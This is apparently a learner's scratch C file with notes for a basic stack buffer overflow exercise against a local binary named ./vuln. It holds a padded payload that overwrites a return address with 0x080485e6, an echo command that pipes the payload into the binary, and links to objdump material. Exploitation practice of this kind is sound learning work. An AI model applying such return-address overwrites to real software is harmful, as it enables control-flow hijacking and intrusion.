#include <stdio.h>

void b_func() {
    int p, q;
    printf("b_func");
}

void a_func() {
    int x, y;
    printf("a_func");
}

int main()
{
    a_func();
    b_func();
    char a[4] = {0x08, 0x04, 0x85, 0xe6};
    printf("%s\n", a);
    return 0;
}

// aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1111
// asli: 0x8048705
// aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��@
// aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x85\x04\x08
// 080485e6

echo -e -n 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafaaaa\xe6\x85\x04\x08' | ./vuln

https://www.howtoforge.com/linux-objdump-command/
objdump -d
https://www.youtube.com/watch?v=LkqZ8I2FVuQ